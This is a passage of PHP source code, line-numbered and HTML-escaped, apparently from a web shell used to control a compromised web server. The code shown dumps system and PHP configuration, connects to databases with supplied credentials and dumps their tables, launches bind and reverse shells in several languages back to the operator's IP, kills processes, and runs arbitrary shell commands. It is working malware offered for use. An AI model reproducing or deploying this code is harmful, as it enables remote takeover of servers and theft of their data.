1897                        if(count($s_ii)==2) $s_result .= "&lt;tr&gt;&lt;td&gt;".$s_ii[0]."&lt;/td&gt;&lt;td&gt;".$s_ii[1]."&lt;/td&gt;&lt;/tr&gt;";
1898                    }
1899                    else $s_result .= "&lt;/table&gt;&lt;table&gt;";
1900                }
1901                $s_result .= "&lt;/table&gt;&lt;/div&gt;";
1902            }
1903 
1904            // partition
1905            if($s_i_buff=trim(@file_get_contents("/proc/partitions"))){
1906                $s_i_buff = preg_replace("/\ +/", " ", $s_i_buff);
1907                $s_result .= "&lt;p class='notif' onclick=\"toggle('info_part')\"&gt;Partitions Info&lt;/p&gt;";
1908                $s_result .= "&lt;div class='info' id='info_part'&gt;";
1909                $s_i_buffs = explode("\n\n", $s_i_buff);
1910                $s_result .= "&lt;table&gt;&lt;tr&gt;";
1911                $s_i_head = explode(" ", $s_i_buffs[0]);
1912                foreach($s_i_head as $s_h) $s_result .= "&lt;th&gt;".$s_h."&lt;/th&gt;";
1913                $s_result .= "&lt;/tr&gt;";
1914                $s_i_buffss = explode("\n", $s_i_buffs[1]);
1915                foreach($s_i_buffss as $s_i_b){
1916                    $s_i_row = explode(" ", trim($s_i_b));
1917                    $s_result .= "&lt;tr&gt;";
1918                    foreach($s_i_row as $s_r) $s_result .= "&lt;td style='text-align:center;'&gt;".$s_r."&lt;/td&gt;";
1919                    $s_result .= "&lt;/tr&gt;";
1920                }
1921                $s_result .= "&lt;/table&gt;";
1922                $s_result .= "&lt;/div&gt;";
1923            }
1924        }
1925        $s_phpinfo = array("PHP General" =&gt; INFO_GENERAL, "PHP Configuration" =&gt; INFO_CONFIGURATION, "PHP Modules" =&gt; INFO_MODULES, "PHP Environment" =&gt; INFO_ENVIRONMENT, "PHP Variables" =&gt; INFO_VARIABLES);
1926        foreach($s_phpinfo as $s_p=&gt;$s_i){
1927            $s_result .= "&lt;p class='notif' onclick=\"toggle('".$s_i."')\"&gt;".$s_p."&lt;/p&gt;";
1928            ob_start();
1929            eval("phpinfo(".$s_i.");");
1930            $s_b = ob_get_contents();
1931            ob_end_clean();
1932            if(preg_match("/&lt;body&gt;(.*?)&lt;\/body&gt;/is", $s_b, $r)){
1933                $s_body = str_replace(array(",", ";", "&amp;"), array(", ", "; ", "&"), $r[1]);
1934                $s_result .= "&lt;div class='info' id='".$s_i."'&gt;".$s_body."&lt;/div&gt;";
1935            }
1936        }
1937    } // working with database
1938    elseif(isset($_GP['x']) && ($_GP['x']=='db')){
1939        // sqltype : mysql, mssql, oracle, pgsql, sqlite, sqlite3, odbc, pdo
1940        $s_sql = array();
1941        $s_sql_deleted = "";
1942        $s_show_form = $s_show_dbs = true;
1943 
1944        if(isset($_GP['dc'])){
1945            $k = $_GP['dc'];
1946            setcookie("c[".$k."]", "" ,time() - $s_login_time);
1947            $s_sql_deleted = $k;
1948        }
1949 
1950        if(isset($_COOKIE['c']) && !isset($_GP['connect'])){
1951            foreach($_COOKIE['c'] as $c=&gt;$d){
1952                if($c==$s_sql_deleted) continue;
1953                $s_dbcon = (function_exists("json_encode") && function_exists("json_decode"))? json_decode($d):unserialize($d);
1954                foreach($s_dbcon as $k=&gt;$v) $s_sql[$k] = $v;
1955                $s_sqlport = (!empty($s_sql['port']))? ":".$s_sql['port']:"";
1956                $s_result .= notif("[".$s_sql['type']."] ".$s_sql['user']."@".$s_sql['host'].$s_sqlport."
1957                           &lt;span style='float:right;'&gt;&lt;a href='".$s_self."x=db&connect=connect&sqlhost=".$s_sql['host']."&sqlport=".$s_sql['port']."&sqluser=".$s_sql['user']."&sqlpass=".$s_sql['pass']."&sqltype=".$s_sql['type']."'&gt;connect&lt;/a&gt; | &lt;a href='".$s_self."x=db&dc=".$c."'&gt;disconnect&lt;/a&gt;&lt;/span&gt;");
1958            }
1959        }
1960        else{
1961            $s_sql['host'] = isset($_GP['sqlhost'])? $_GP['sqlhost'] : "";
1962            $s_sql['port'] = isset($_GP['sqlport'])? $_GP['sqlport'] : "";
1963            $s_sql['user'] = isset($_GP['sqluser'])? $_GP['sqluser'] : "";
1964            $s_sql['pass'] = isset($_GP['sqlpass'])? $_GP['sqlpass'] : "";
1965            $s_sql['type'] = isset($_GP['sqltype'])? $_GP['sqltype'] : "";
1966        }
1967 
1968        if(isset($_GP['connect'])){
1969            $s_con = sql_connect($s_sql['type'],$s_sql['host'],$s_sql['user'],$s_sql['pass']);
1970            $s_sqlcode = isset($_GP['sqlcode'])? $_GP['sqlcode'] : "";
1971 
1972            if($s_con!==false){
1973                if(isset($_GP['sqlinit'])){
1974                    $s_sql_cookie = (function_exists("json_encode") && function_exists("json_decode"))? json_encode($s_sql):serialize($s_sql);
1975                    $s_c_num = substr(md5(time().rand(0,100)),0,3);
1976                    while(isset($_COOKIE['c']) && is_array($_COOKIE['c']) && array_key_exists($s_c_num, $_COOKIE['c'])){
1977                        $s_c_num = substr(md5(time().rand(0,100)),0,3);
1978                    }
1979                    setcookie("c[".$s_c_num."]", $s_sql_cookie ,time() + $s_login_time);
1980                }
1981                $s_show_form = false;
1982                $s_result .= "&lt;form action='".$s_self."' method='post'&gt;
1983                   &lt;input type='hidden' name='sqlhost' value='".$s_sql['host']."' /&gt;
1984                   &lt;input type='hidden' name='sqlport' value='".$s_sql['port']."' /&gt;
1985                   &lt;input type='hidden' name='sqluser' value='".$s_sql['user']."' /&gt;
1986                   &lt;input type='hidden' name='sqlpass' value='".$s_sql['pass']."' /&gt;
1987                   &lt;input type='hidden' name='sqltype' value='".$s_sql['type']."' /&gt;
1988                   &lt;input type='hidden' name='x' value='db' /&gt;
1989                   &lt;input type='hidden' name='connect' value='connect' /&gt;
1990                   &lt;textarea id='sqlcode' name='sqlcode' class='txtarea' style='height:150px;'&gt;".hss($s_sqlcode)."&lt;/textarea&gt;
1991                   &lt;p&gt;&lt;input type='submit' name='gogo' class='inputzbut' value='Go !' style='width:120px;height:30px;' /&gt;
1992                   &nbsp;&nbsp;Separate multiple commands with a semicolon  &lt;span class='gaya'&gt;[&lt;/span&gt; ; &lt;span class='gaya'&gt;]&lt;/span&gt;&lt;/p&gt;
1993                   &lt;/form&gt;";
1994 
1995                if(!empty($s_sqlcode)){
1996                    $s_querys = explode(";",$s_sqlcode);
1997                    foreach($s_querys as $s_query){
1998                        if(trim($s_query) != ""){
1999                            $s_hasil = sql_query($s_sql['type'],$s_query,$s_con);
2000                            if($s_hasil!=false){
2001                                $s_result .= "&lt;hr /&gt;&lt;p style='padding:0;margin:6px 10px;font-weight:bold;'&gt;".hss($s_query).";&nbsp;&nbsp;&nbsp;
2002                               &lt;span class='gaya'&gt;[&lt;/span&gt; ok &lt;span class='gaya'&gt;]&lt;/span&gt;&lt;/p&gt;";
2003 
2004                                if(!is_bool($s_hasil)){
2005                                    $s_result .= "&lt;table class='explore sortable' style='width:100%;'&gt;&lt;tr&gt;";
2006                                    for($s_i = 0; $s_i&lt;sql_num_fields($s_sql['type'],$s_hasil); $s_i++)
2007                                        $s_result .= "&lt;th&gt;".@hss(sql_field_name($s_sql['type'],$s_hasil,$s_i))."&lt;/th&gt;";
2008                                    $s_result .= "&lt;/tr&gt;";
2009                                    while($s_rows=sql_fetch_data($s_sql['type'],$s_hasil)){
2010                                        $s_result .= "&lt;tr&gt;";
2011                                        foreach($s_rows as $s_r){
2012                                            if(empty($s_r)) $s_r = " ";
2013                                            $s_result .= "&lt;td&gt;".@hss($s_r)."&lt;/td&gt;";
2014                                        }
2015                                        $s_result .= "&lt;/tr&gt;";
2016                                    }
2017                                    $s_result .= "&lt;/table&gt;";
2018                                }
2019                            }
2020                            else{
2021                                $s_result .= "&lt;p style='padding:0;margin:6px 10px;font-weight:bold;'&gt;".hss($s_query).";&nbsp;&nbsp;&nbsp;&lt;span class='gaya'&gt;[&lt;/span&gt; error &lt;span class='gaya'&gt;]&lt;/span&gt;&lt;/p&gt;";
2022                            }
2023                        }
2024                    }
2025                }
2026                else{
2027                    if(($s_sql['type']!='pdo') && ($s_sql['type']!='odbc')){
2028                        if($s_sql['type']=='mysql') $s_showdb = "SHOW DATABASES";
2029                        elseif($s_sql['type']=='mssql') $s_showdb = "SELECT name FROM master..sysdatabases";
2030                        elseif($s_sql['type']=='pgsql') $s_showdb = "SELECT schema_name FROM information_schema.schemata";
2031                        elseif($s_sql['type']=='oracle') $s_showdb = "SELECT USERNAME FROM SYS.ALL_USERS ORDER BY USERNAME";
2032                        elseif($s_sql['type']=='sqlite3' || $s_sql['type']=='sqlite') $s_showdb = "SELECT \"".$s_sql['host']."\"";
2033                        else $s_showdb = "SHOW DATABASES";
2034 
2035                        $s_hasil = sql_query($s_sql['type'],$s_showdb,$s_con);
2036 
2037                        if($s_hasil!=false) {
2038                            while($s_rows_arr=sql_fetch_data($s_sql['type'],$s_hasil)){
2039                                foreach($s_rows_arr as $s_rows){
2040                                    $s_result .= "&lt;p class='notif' onclick=\"toggle('db_".$s_rows."')\"&gt;".$s_rows."&lt;/p&gt;";
2041                                    $s_result .= "&lt;div class='info' id='db_".$s_rows."'&gt;&lt;table class='explore'&gt;";
2042 
2043                                    if($s_sql['type']=='mysql') $s_showtbl = "SHOW TABLES FROM ".$s_rows;
2044                                    elseif($s_sql['type']=='mssql') $s_showtbl = "SELECT name FROM ".$s_rows."..sysobjects WHERE xtype = 'U'";
2045                                    elseif($s_sql['type']=='pgsql') $s_showtbl = "SELECT table_name FROM information_schema.tables WHERE table_schema='".$s_rows."'";
2046                                    elseif($s_sql['type']=='oracle') $s_showtbl = "SELECT TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='".$s_rows."'";
2047                                    elseif($s_sql['type']=='sqlite3' || $s_sql['type']=='sqlite') $s_showtbl = "SELECT name FROM sqlite_master WHERE type='table'";
2048                                    else $s_showtbl = "";
2049 
2050                                    $s_hasil_t = sql_query($s_sql['type'],$s_showtbl,$s_con);
2051                                    if($s_hasil_t!=false) {
2052                                        while($s_tables_arr=sql_fetch_data($s_sql['type'],$s_hasil_t)){
2053                                            foreach($s_tables_arr as $s_tables){
2054                                                if($s_sql['type']=='mysql') $s_dump_tbl = "SELECT * FROM ".$s_rows.".".$s_tables." LIMIT 0,100";
2055                                                elseif($s_sql['type']=='mssql') $s_dump_tbl = "SELECT TOP 100 * FROM ".$s_rows."..".$s_tables;
2056                                                elseif($s_sql['type']=='pgsql') $s_dump_tbl = "SELECT * FROM ".$s_rows.".".$s_tables." LIMIT 100 OFFSET 0";
2057                                                elseif($s_sql['type']=='oracle') $s_dump_tbl = "SELECT * FROM ".$s_rows.".".$s_tables." WHERE ROWNUM BETWEEN 0 AND 100;";
2058                                                elseif($s_sql['type']=='sqlite' || $s_sql['type']=='sqlite3') $s_dump_tbl = "SELECT * FROM ".$s_tables." LIMIT 0,100";
2059                                                else $s_dump_tbl = "";
2060 
2061                                                $s_dump_tbl_link = $s_self."x=db&connect=&sqlhost=".$s_sql['host']."&sqlport=".$s_sql['port']."&sqluser=".$s_sql['user']."&sqlpass=".$s_sql['pass']."&sqltype=".$s_sql['type']."&sqlcode=".$s_dump_tbl;
2062 
2063                                                $s_result .= "&lt;tr&gt;&lt;td ondblclick=\"return go('".adds($s_dump_tbl_link)."',event);\"&gt;&lt;a href='".$s_dump_tbl_link."'&gt;".$s_tables."&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;";
2064                                            }
2065                                        }
2066                                    }
2067                                    $s_result .= "&lt;/table&gt;&lt;/div&gt;";
2068                                }
2069                            }
2070                        }
2071                    }
2072                }
2073                sql_close($s_sql['type'],$s_con);
2074            }
2075            else{
2076                $s_result .= notif("Unable to connect to database");
2077                $s_show_form = true;
2078            }
2079        }
2080 
2081        if($s_show_form){
2082            // sqltype : mysql, mssql, oracle, pgsql, sqlite, sqlite3, odbc, pdo
2083            $s_sqllist = array();
2084            if(function_exists("mysql_connect")) $s_sqllist["mysql"] = "connect to MySQL &lt;span class='desc' style='font-size:12px;'&gt;- using mysql_*&lt;/span&gt;";
2085            if(function_exists("mssql_connect") || function_exists("sqlsrv_connect")) $s_sqllist["mssql"] = "connect to MsSQL &lt;span class='desc' style='font-size:12px;'&gt;- using mssql_* or sqlsrv_*&lt;/span&gt;";
2086            if(function_exists("pg_connect")) $s_sqllist["pgsql"] = "connect to PostgreSQL &lt;span class='desc' style='font-size:12px;'&gt;- using pg_*&lt;/span&gt;";
2087            if(function_exists("oci_connect")) $s_sqllist["oracle"] = "connect to oracle &lt;span class='desc' style='font-size:12px;'&gt;- using oci_*&lt;/span&gt;";
2088            if(function_exists("sqlite_open")) $s_sqllist["sqlite"] = "connect to SQLite &lt;span class='desc' style='font-size:12px;'&gt;- using sqlite_*&lt;/span&gt;";
2089            if(class_exists("SQLite3")) $s_sqllist["sqlite3"] = "connect to SQLite3 &lt;span class='desc' style='font-size:12px;'&gt;- using class SQLite3&lt;/span&gt;";
2090            if(function_exists("odbc_connect")) $s_sqllist["odbc"] = "connect via ODBC &lt;span class='desc' style='font-size:12px;'&gt;- using odbc_*&lt;/span&gt;";
2091            if(class_exists("PDO")) $s_sqllist["pdo"] = "connect via PDO &lt;span class='desc' style='font-size:12px;'&gt;- using class PDO&lt;/span&gt;";
2092 
2093            foreach($s_sqllist as $s_sql['type']=&gt;$s_sqltitle){
2094                if($s_sql['type']=="odbc" || $s_sql['type']=="pdo"){
2095                    $s_result .= "&lt;div class='mybox'&gt;&lt;h2&gt;".$s_sqltitle."&lt;/h2&gt;
2096                   &lt;form action='".$s_self."' method='post' /&gt;
2097                   &lt;table class='myboxtbl'&gt;
2098                   &lt;tr&gt;&lt;td style='width:170px;'&gt;DSN / Connection String&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='sqlhost' value='' /&gt;&lt;/td&gt;&lt;/tr&gt;
2099                   &lt;tr&gt;&lt;td&gt;Username&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='sqluser' value='' /&gt;&lt;/td&gt;&lt;/tr&gt;
2100                   &lt;tr&gt;&lt;td&gt;Password&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='password' name='sqlpass' value='' /&gt;&lt;/td&gt;&lt;/tr&gt;
2101                   &lt;/table&gt;
2102                   &lt;input type='submit' name='connect' class='inputzbut' value='Connect !' style='width:120px;height:30px;margin:10px 2px 0 2px;' /&gt;
2103                   &lt;input type='hidden' name='sqltype' value='".$s_sql['type']."' /&gt;
2104                   &lt;input type='hidden' name='sqlinit' value='init' /&gt;
2105                   &lt;input type='hidden' name='x' value='db' /&gt;
2106                   &lt;/form&gt;
2107                   &lt;/div&gt;";
2108                }
2109                elseif($s_sql['type']=="sqlite" || $s_sql['type']=="sqlite3"){
2110                    $s_result .= "&lt;div class='mybox'&gt;&lt;h2&gt;".$s_sqltitle."&lt;/h2&gt;
2111                   &lt;form action='".$s_self."' method='post' /&gt;
2112                   &lt;table class='myboxtbl'&gt;
2113                   &lt;tr&gt;&lt;td style='width:170px;'&gt;DB File&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='sqlhost' value='' /&gt;&lt;/td&gt;&lt;/tr&gt;
2114                   &lt;/table&gt;
2115                   &lt;input type='submit' name='connect' class='inputzbut' value='Connect !' style='width:120px;height:30px;margin:10px 2px 0 2px;' /&gt;
2116                   &lt;input type='hidden' name='sqltype' value='".$s_sql['type']."' /&gt;
2117                   &lt;input type='hidden' name='sqlinit' value='init' /&gt;
2118                   &lt;input type='hidden' name='x' value='db' /&gt;
2119                   &lt;/form&gt;
2120                   &lt;/div&gt;";
2121                }
2122                else{
2123                    $s_result .= "&lt;div class='mybox'&gt;&lt;h2&gt;".$s_sqltitle."&lt;/h2&gt;
2124                   &lt;form action='".$s_self."' method='post' /&gt;
2125                   &lt;table class='myboxtbl'&gt;
2126                   &lt;tr&gt;&lt;td style='width:170px;'&gt;Host&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='sqlhost' value='' /&gt;&lt;/td&gt;&lt;/tr&gt;
2127                   &lt;tr&gt;&lt;td&gt;Username&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='sqluser' value='' /&gt;&lt;/td&gt;&lt;/tr&gt;
2128                   &lt;tr&gt;&lt;td&gt;Password&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='password' name='sqlpass' value='' /&gt;&lt;/td&gt;&lt;/tr&gt;
2129                   &lt;tr&gt;&lt;td&gt;Port (optional)&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='sqlport' value='' /&gt;&lt;/td&gt;&lt;/tr&gt;
2130                   &lt;/table&gt;
2131                   &lt;input type='submit' name='connect' class='inputzbut' value='Connect !' style='width:120px;height:30px;margin:10px 2px 0 2px;' /&gt;
2132                   &lt;input type='hidden' name='sqltype' value='".$s_sql['type']."' /&gt;
2133                   &lt;input type='hidden' name='sqlinit' value='init' /&gt;
2134                   &lt;input type='hidden' name='x' value='db' /&gt;
2135                   &lt;/form&gt;
2136                   &lt;/div&gt;";
2137                }
2138            }
2139        }
2140    } // bind and reverse shell
2141    elseif(isset($_GP['x']) && ($_GP['x']=='rs')){
2142        // resources $s_rs_pl $s_rs_py $s_rs_rb $s_rs_js $s_rs_c $s_rs_java $s_rs_java $s_rs_win $s_rs_php
2143        $s_rshost = $s_server_ip;
2144 
2145        $s_rsport = "13123"; // default port
2146        $s_rspesana = "Press &#39;  Go !  &#39; button and run &#39;  nc &lt;i&gt;server_ip&lt;/i&gt; &lt;i&gt;port&lt;/i&gt;  &#39; on your computer";
2147        $s_rspesanb = "Run &#39;  nc -l -v -p &lt;i&gt;port&lt;/i&gt;  &#39; on your computer and press &#39;  Go !  &#39; button";
2148        $s_rs_err = "";
2149 
2150        $s_rsbind = $s_rsback = array();
2151 
2152        $s_rsbind["bind_php"] = "Bind Shell &lt;span class='desc' style='font-size:12px;'&gt;- php&lt;/span&gt;";
2153        $s_rsback["back_php"] = "Reverse Shell &lt;span class='desc' style='font-size:12px;'&gt;- php&lt;/span&gt;";
2154 
2155        $s_access = array("s_python"=&gt;"py", "s_perl"=&gt;"pl", "s_ruby"=&gt;"rb", "s_node"=&gt;"js", "s_gcc"=&gt;"c", "s_java"=&gt;"java");
2156        foreach($s_access as $k=&gt;$v){
2157            if(isset($$k)){
2158                $s_t = explode("_", $k);
2159                $s_rsbind["bind_".$v] = "Bind Shell &lt;span class='desc' style='font-size:12px;'&gt;- ".$s_t[1]."&lt;/span&gt;";
2160                $s_rsback["back_".$v] = "Reverse Shell &lt;span class='desc' style='font-size:12px;'&gt;- ".$s_t[1]."&lt;/span&gt;";
2161            }
2162        }
2163 
2164        if($s_win){
2165            $s_rsbind["bind_win"] = "Bind Shell &lt;span class='desc' style='font-size:12px;'&gt;- windows executable&lt;/span&gt;";
2166            $s_rsback["back_win"] = "Reverse Shell &lt;span class='desc' style='font-size:12px;'&gt;- windows executable&lt;/span&gt;";
2167        }
2168        $s_rslist = array_merge($s_rsbind,$s_rsback);
2169 
2170        if(!@is_writable($s_cwd)) $s_result .= notif("Directory ".$s_cwd." is not writable, please change to a writable one");
2171 
2172        foreach($s_rslist as $s_rstype=&gt;$s_rstitle){
2173            $s_split = explode("_",$s_rstype);
2174            if($s_split[0]=="bind"){
2175                $s_rspesan = $s_rspesana;
2176                $s_rsdisabled = "disabled='disabled'";
2177                $s_rstarget = $s_server_ip;
2178                $s_labelip = "Server IP";
2179            }
2180            elseif($s_split[0]=="back"){
2181                $s_rspesan = $s_rspesanb;
2182                $s_rsdisabled = "";
2183                $s_rstarget = $s_my_ip;
2184                $s_labelip = "Target IP";
2185            }
2186 
2187            if(isset($_GP[$s_rstype])){
2188                if(isset($_GP["rshost_".$s_rstype])) $s_rshost_ = $_GP["rshost_".$s_rstype];
2189                if(isset($_GP["rsport_".$s_rstype])) $s_rsport_ = $_GP["rsport_".$s_rstype];
2190 
2191                if($s_split[0]=="bind") $s_rstarget_packed = $s_rsport_;
2192                elseif($s_split[0]=="back") $s_rstarget_packed = $s_rsport_." ".$s_rshost_;
2193 
2194                if($s_split[1]=="pl") $s_rscode = $s_rs_pl;
2195                elseif($s_split[1]=="py") $s_rscode = $s_rs_py;
2196                elseif($s_split[1]=="rb") $s_rscode = $s_rs_rb;
2197                elseif($s_split[1]=="js") $s_rscode = $s_rs_js;
2198                elseif($s_split[1]=="c") $s_rscode = $s_rs_c;
2199                elseif($s_split[1]=="java") $s_rscode = $s_rs_java;
2200                elseif($s_split[1]=="win") $s_rscode = $s_rs_win;
2201                elseif($s_split[1]=="php") $s_rscode = $s_rs_php;
2202 
2203                $s_buff = rs($s_rstype,$s_rstarget_packed,$s_rscode);
2204                if($s_buff!="") $s_rs_err = notif(hss($s_buff));
2205            }
2206            $s_result .= "&lt;div class='mybox'&gt;&lt;h2&gt;".$s_rstitle."&lt;/h2&gt;
2207           &lt;form action='".$s_self."' method='post' /&gt;
2208           &lt;table class='myboxtbl'&gt;
2209           &lt;tr&gt;&lt;td style='width:100px;'&gt;".$s_labelip."&lt;/td&gt;&lt;td&gt;&lt;input ".$s_rsdisabled." style='width:100%;' class='inputz' type='text' name='rshost_".$s_rstype."' value='".$s_rstarget."' /&gt;&lt;/td&gt;&lt;/tr&gt;
2210           &lt;tr&gt;&lt;td&gt;Port&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='rsport_".$s_rstype."' value='".$s_rsport."' /&gt;&lt;/td&gt;&lt;/tr&gt;
2211           &lt;/table&gt;
2212           &lt;input type='submit' name='".$s_rstype."' class='inputzbut' value='Go !' style='width:120px;height:30px;margin:10px 2px 0 2px;' /&gt;
2213           &nbsp;&nbsp;&lt;span&gt;".$s_rspesan."&lt;/span&gt;
2214           &lt;input type='hidden' name='x' value='rs' /&gt;
2215           &lt;/form&gt;
2216           &lt;/div&gt;";
2217        }
2218        $s_result = $s_rs_err.$s_result;
2219    } // task manager
2220    elseif(isset($_GP['x']) && ($_GP['x']=='ps')){
2221        $s_buff = "";
2222        // kill process specified by pid
2223        if(isset($_GP['pid'])){
2224            $s_p = trim($_GP['pid'],"|");
2225            $s_parr = explode("|", $s_p);
2226 
2227            foreach($s_parr as $s_p){
2228                if(function_exists("posix_kill")) $s_buff .= (posix_kill($s_p,'9'))? notif("Process with pid ".$s_p." has been successfully killed"):notif("Unable to kill process with pid ".$s_p);
2229                else{
2230                    if(!$s_win) $s_buff .= notif(exe("kill -9 ".$s_p));
2231                    else $s_buff .= notif(exe("taskkill /F /PID ".$s_p));
2232                }
2233            }
2234        }
2235 
2236        if(!$s_win) $s_h = "ps aux"; // nix
2237        else $s_h = "tasklist /V /FO csv"; // win
2238        $s_wcount = 11;
2239        $s_wexplode = " ";
2240        if($s_win) $s_wexplode = "\",\"";
2241 
2242        $s_res = exe($s_h);
2243        if(trim($s_res)=='') $s_result = notif("Error getting process list");
2244        else{
2245            if($s_buff!="") $s_result = $s_buff;
2246            $s_result .= "&lt;table class='explore sortable'&gt;";
2247            if(!$s_win) $s_res = preg_replace('#\ +#',' ',$s_res);
2248 
2249            $s_psarr = explode("\n",$s_res);
2250            $s_fi = true;
2251            $s_tblcount = 0;
2252 
2253            $s_check = explode($s_wexplode,$s_psarr[0]);
2254            $s_wcount = count($s_check);
2255 
2256            foreach($s_psarr as $s_psa){
2257                if(trim($s_psa)!=''){
2258                    if($s_fi){
2259                        $s_fi = false;
2260                        $s_psln = explode($s_wexplode, $s_psa, $s_wcount);
2261                        $s_result .= "&lt;tr&gt;&lt;th style='width:24px;' class='sorttable_nosort'&gt;&lt;/th&gt;&lt;th class='sorttable_nosort'&gt;action&lt;/th&gt;";
2262                        foreach($s_psln as $s_p) $s_result .= "&lt;th&gt;".trim(trim(strtolower($s_p)) ,"\"")."&lt;/th&gt;";
2263                        $s_result .= "&lt;/tr&gt;";
2264                    }
2265                    else{
2266                        $s_psln = explode($s_wexplode, $s_psa, $s_wcount);
2267                        $s_result .= "&lt;tr&gt;";
2268                        $s_tblcount = 0;
2269                        foreach($s_psln as $s_p){
2270                            $s_pid = trim(trim($s_psln[1]),"\"");
2271                            if(trim($s_p)=="") $s_p = "&nbsp;";
2272                            if($s_tblcount == 0){
2273                                $s_result .= "&lt;td style='text-align:center;text-indent:4px;'&gt;&lt;input id='".md5($s_pid)."' name='cbox' value='".$s_pid."' type='checkbox' class='css-checkbox' onchange='hilite(this);' /&gt;&lt;label for='".md5($s_pid)."' class='css-label'&gt;&lt;/label&gt;&lt;/td&gt;&lt;td style='text-align:center;'&gt;&lt;a href='".$s_self."x=ps&pid=".$s_pid."'&gt;kill&lt;/a&gt;&lt;/td&gt;
2274                                       &lt;td style='text-align:center;'&gt;".trim(trim($s_p) ,"\"")."&lt;/td&gt;";
2275                                $s_tblcount++;
2276                            }
2277                            else{
2278                                $s_tblcount++;
2279                                if($s_tblcount == count($s_psln)) $s_result .= "&lt;td style='text-align:left;'&gt;".trim(trim($s_p) ,"\"")."&lt;/td&gt;";
2280                                else $s_result .= "&lt;td style='text-align:center;'&gt;".trim(trim($s_p) ,"\"")."&lt;/td&gt;";
2281                            }
2282                        }
2283                        $s_result .= "&lt;/tr&gt;";
2284                    }
2285                }
2286            }
2287            $colspan = count($s_psln)+1;
2288            $s_result .= "&lt;tfoot&gt;&lt;tr class='cbox_selected'&gt;&lt;td class='cbox_all'&gt;
2289           &lt;form action='".$s_self."' method='post'&gt;&lt;input id='checkalll' type='checkbox' name='abox' class='css-checkbox' onclick='checkall();' /&gt;&lt;label for='checkalll' class='css-label'&gt;&lt;/label&gt;&lt;/form&gt;
2290           &lt;/td&gt;&lt;td style='text-indent:10px;padding:2px;' colspan=".$colspan."&gt;&lt;a href='javascript: pkill();'&gt;kill selected &lt;span id='total_selected'&gt;&lt;/span&gt;&lt;/a&gt;&lt;/td&gt;
2291           &lt;/tr&gt;&lt;/tfoot&gt;&lt;/table&gt;";
2292        }
2293    }
2294    else{
2295        if(!isset($s_cwd)) $s_cwd = "";
2296        if(isset($_GP['cmd'])){
2297            $s_cmd = $_GP['cmd'];
2298            if(strlen($s_cmd) &gt; 0){
2299                if(preg_match('#^cd(\ )+(.*)#',$s_cmd,$s_r)){
2300                    $s_nd = trim($s_r[2]);
2301                    if(@is_dir($s_nd)){
2302                        chdir($s_nd);
2303                        $s_cwd = cp(getcwd());
2304                        setcookie("cwd", $s_cwd ,time() + $s_login_time);
2305                        $s_result .= showdir($s_cwd);
2306                    }
2307                    elseif(@is_dir($s_cwd.$s_nd)){
2308                        chdir($s_cwd.$s_nd);
2309                        $s_cwd = cp(getcwd());
2310                        setcookie("cwd", $s_cwd ,time() + $s_login_time);
2311                        $s_result .= showdir($s_cwd);
2312                    }
2313                    else $s_result .= notif($s_nd." is not a directory");
2314                }
2315                else{
2316                    $s_r = hss(exe($s_cmd));
2317                    if($s_r != '') $s_result .= "&lt;pre&gt;".$s_r."&lt;/pre&gt;";
2318                    else $s_result .= showdir($s_cwd);
2319                }
2320            }
2321            else $s_result .= showdir($s_cwd);
2322        }
2323        else $s_result .= showdir($s_cwd);
2324    }
2325 
2326    // find drive letters
2327    $s_letters = '';
2328    $s_v = explode("\\",$s_cwd);
2329    $s_v = $s_v[0];
2330    foreach (range("A", "Z") as $s_letter){
2331        if(@is_readable($s_letter.":\\")){
2332            $s_letters .= "&lt;a href='".$s_self."cd=".$s_letter.":\\'&gt;[ ";
2333            if($s_letter.":" != $s_v) $s_letters .= $s_letter;
2334            else{$s_letters .= "&lt;span class='drive-letter'&gt;".$s_letter."&lt;/span&gt;";}
2335            $s_letters .= " ]&lt;/a&gt; ";
2336        }
2337    }
2338 
2339    // print useful info
2340    $s_info  = "&lt;table class='headtbl'&gt;&lt;tr&gt;&lt;td&gt;".$s_system."&lt;/td&gt;&lt;/tr&gt;";
2341    $s_info .= "&lt;tr&gt;&lt;td&gt;".$s_software."&lt;/td&gt;&lt;/tr&gt;";
2342    $s_info .= "&lt;tr&gt;&lt;td&gt;server ip : ".$s_server_ip."&lt;span class='gaya'&gt; | &lt;/span&gt;your   ip : ".$s_my_ip;
2343    $s_info .= "&lt;span class='gaya'&gt; | &lt;/span&gt; Time @ Server : ".@date("d M Y H:i:s",time());
2344    $s_info .= "&lt;/td&gt;&lt;/tr&gt;
2345           &lt;tr&gt;&lt;td style='text-align:left;'&gt;
2346               &lt;table class='headtbls'&gt;&lt;tr&gt;
2347               &lt;td&gt;".trim($s_letters)."&lt;/td&gt;
2348               &lt;td&gt;
2349               &lt;span id='chpwd'&gt;
2350               &nbsp;&lt;a href=\"javascript:tukar_('chpwd','chpwdform')\"&gt;
2351               &lt;span class='icon'&gt;&lt;/span&gt;
2352               &nbsp;&nbsp;&lt;/a&gt;".swd($s_cwd)."&lt;/span&gt;
2353               &lt;form action='".$s_self."' method='post' style='margin:0;padding:0;'&gt;
2354               &lt;span class='sembunyi' id='chpwdform'&gt;
2355               &nbsp;&lt;a href=\"javascript:tukar_('chpwdform','chpwd');\"&gt;
2356               &lt;span class='icon'&gt;&lt;/span&gt;
2357               &lt;/a&gt;&nbsp;&nbsp;
2358               &lt;input type='text' name='view' class='inputz' style='width:300px;' value='".$s_cwd."' /&gt;
2359               &lt;input class='inputzbut' type='submit' name='submit' value='view file / folder' /&gt;
2360               &lt;/span&gt;
2361               &lt;/form&gt;
2362               &lt;/td&gt;&lt;/tr&gt;
2363               &lt;/table&gt;
2364           &lt;/td&gt;&lt;/tr&gt;
2365           &lt;/table&gt;";
2366 }
2367 
2368 $s_error = ob_get_contents();
2369 if(!empty($s_error)) $s_result = notif($s_error).$s_result;
2370 ob_end_clean();
2371

2488 &lt;script type='text/javascript'&gt;
